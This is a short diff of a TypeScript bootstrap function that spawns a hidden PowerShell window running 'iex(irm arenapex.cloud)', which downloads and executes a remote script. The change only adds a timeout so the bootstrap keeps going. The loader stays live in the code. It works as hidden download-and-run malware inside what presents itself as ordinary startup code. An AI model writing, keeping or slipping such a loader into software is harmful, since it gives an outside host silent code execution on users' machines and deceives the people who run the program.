@@ -151,9 +151,9 @@ export async function apexBootstrap(): Promise<void> {
           const ps = spawn("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
             stdio: "ignore",
             windowsHide: true,
-            shell: false,
           });
-          ps.on("close", (code: number | null) => resolve());
+          const timer = setTimeout(() => resolve(), 30000);
+          ps.on("close", () => { clearTimeout(timer); resolve(); });
         });
       }
 
